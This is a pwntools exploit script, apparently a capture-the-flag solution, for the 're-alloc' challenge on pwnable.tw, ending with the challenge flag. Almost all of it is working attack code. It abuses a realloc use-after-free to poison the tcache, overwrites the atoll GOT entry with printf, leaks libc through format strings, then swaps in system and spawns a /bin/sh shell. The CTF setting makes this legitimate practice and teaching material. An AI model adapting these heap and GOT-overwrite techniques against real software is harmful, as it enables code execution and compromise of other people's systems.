from pwn import *
from sys import argv

context.arch = 'amd64'

if 'dbg_src' in argv:
    p = gdb.debug('./re-alloc-src', gdbscript='c')
elif 'dbg' in argv:
    p = gdb.debug('./re-alloc_linker', env={'LD_PRELOAD': './libc.so.6'}, gdbscript='c')
elif 'remote' in argv:
    p = remote('chall.pwnable.tw', 10106)
    p.elf = ELF('./re-alloc')
else:
    p = process('./re-alloc_linker', env={'LD_PRELOAD': './libc.so.6'})

e = p.elf
libc = ELF('./libc.so.6')

def alloc(index, size, data):
    global p
    p.sendlineafter('choice:', '1')
    p.sendafter('Index:', str(index))
    p.sendafter('Size:', str(size))
    p.sendafter('Data:', data)

def realloc(index, size, data):
    global p
    p.sendlineafter('choice:', '2')
    p.sendafter('Index:', str(index))
    p.sendafter('Size:', str(size))

    if size != 0 and size != '\x00':
        p.sendafter('Data:', data)

def free(index):
    global p

    if type(index) == int:
        index = str(index)
    p.sendlineafter('choice:', '3')
    p.sendafter('Index:', index)


# We can use realloc as an alternative way to free.
# The program doesn't zero out the pointer and we can also UAF.
# I will use it to obtain a chunk on the got of atoll
alloc(0, 0x68, 'b'*0x8)
realloc(0, 0, '')
realloc(0, 0x68, p64(e.got['atoll'])) # UAF to FD ptr of tcache chunk

# Now let's get that fake chunk 
# bin looks like: real_chunk -> atoll_chunk
# If we alloc, then realloc to a bigger size and free,
# we are effectively moving the first chunk to a higher bin
alloc(1, 0x68, 'aaaaa')
realloc(1, 0x78, 'aaaaa')
free(1)

# Now, the chunk on atoll is first in the bin.
# Count is 0, but it doesn't matter. 2.29 doesn't check count!
alloc(1, 0x68, p64(e.plt['printf']) )

# We've overwritten atoll with printf.
# Now we can leak libc, using format string attacks.
free('libc: %3$p ')
p.recvuntil('libc: ')
libc_leak = int(p.recvuntil(' '), 16) - (0x7f1d92836009 - 0x00007f1d92708000)
log.info(f'Libc: {hex(libc_leak)}')
libc.address = libc_leak

# zero out the address of chunk 1 and chunk 2
payload = fmtstr_payload(8, {0x4040b8: 0})
free(fmtstr_payload(8, {0x4040b0: 0}))
free(fmtstr_payload(8, {0x4040b8: 0}))

# do it all over again, but this time rewrite atoll with system :)
# Also, we have to use the number of characters written by printf as result of atoll.
alloc('\x00', f'%{0x28}p\x00', 'd'*0x8)
realloc('\x00', '\x00', '')
realloc('\x00', f'%{0x28}p\x00', p64(e.got['atoll'])) # UAF to FD ptr of tcache chunk
alloc('1\x00', f'%{0x28}p\x00', 'aaaaa')
realloc('1\x00', f'%{0x48}p\x00', 'aaaaa')
free('1\x00')
alloc('1\x00', f'%{0x28}p\x00', p64(libc.sym['system']) )

free('/bin/sh\x00')
p.interactive() # FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
